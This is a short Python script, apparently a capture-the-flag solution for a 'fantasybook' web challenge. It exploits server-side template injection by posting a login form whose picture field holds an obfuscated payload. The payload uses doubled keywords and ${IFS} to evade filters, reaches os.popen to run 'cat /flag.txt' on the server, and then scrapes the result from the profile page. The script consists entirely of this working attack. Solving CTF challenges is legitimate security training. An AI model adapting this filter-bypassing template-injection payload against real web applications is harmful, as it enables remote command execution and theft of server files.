from requests import session
from re import findall

# Init
url = "http://fantasybook.ec2qualifications.esaip-cyber.com/login"
data = {
    "username": "test",
    "age": "test",
    "sexe": "test",
    "picture": "{ {seselflf.__init__.__globals__. sys. modules. ooss. popen('cat${IFS}/flag.${x}txt'). read()} }",
    "description": "test"
}

# Login
s = session()
r = s.post(url, data=data)

# Get profile output
print()
if "You can't sign in using an empty field!" in r.text:
    print("\033[31;1m[-] You can't sign in using an empty field!\033[0m")
else:
    url = "http://fantasybook.ec2qualifications.esaip-cyber.com/profile"
    r = s.get(url)
    output = findall('user picture #(.*?)"', r.text)[0]
    print("\033[33;1mSSTI output:\033[0m", output)
print()
